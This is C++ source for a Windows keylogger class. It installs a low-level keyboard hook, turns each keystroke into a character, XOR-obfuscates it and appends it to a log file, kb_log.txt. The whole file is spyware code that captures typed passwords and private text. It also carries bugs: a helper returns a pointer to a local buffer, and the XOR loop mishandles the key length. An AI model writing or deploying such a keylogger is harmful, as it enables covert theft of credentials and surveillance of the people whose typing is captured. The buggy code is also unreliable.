#include <keylogger.h>

std::ofstream Keylogger::kblog;
wchar_t* Keylogger::key = nullptr;

Keylogger::Keylogger(wchar_t* k) {
    kblog = std::ofstream("kb_log.txt", std::ios::app);
    key = k;
}

Keylogger::~Keylogger() {
    kblog.close();
}

void Keylogger::XOR(wchar_t* data, int data_len, wchar_t* key, int key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

wchar_t* Keylogger::vk2ascii(UINT vkCode) {
    BYTE keyboardState[256];
    for (int i = 0; i < 256; i++) {
        keyboardState[i] = (BYTE)GetKeyState(i);
    }

    WCHAR buffer[4] = {};

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result > 0) return buffer;

    return L'\0';
}

LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;

    if (code == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyStruct->vkCode;
            wchar_t* c = vk2ascii(vkCode);
            std::cout << "Before XOR: " << static_cast<wchar_t>(*c) << std::endl;
            XOR(c, lstrlenW(c), key, lstrlenW(key));
            // std::cout << "After XOR: " << static_cast<char>(*c) << std::endl;
            kblog << static_cast<wchar_t>(*c) << std::endl;
        } 
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}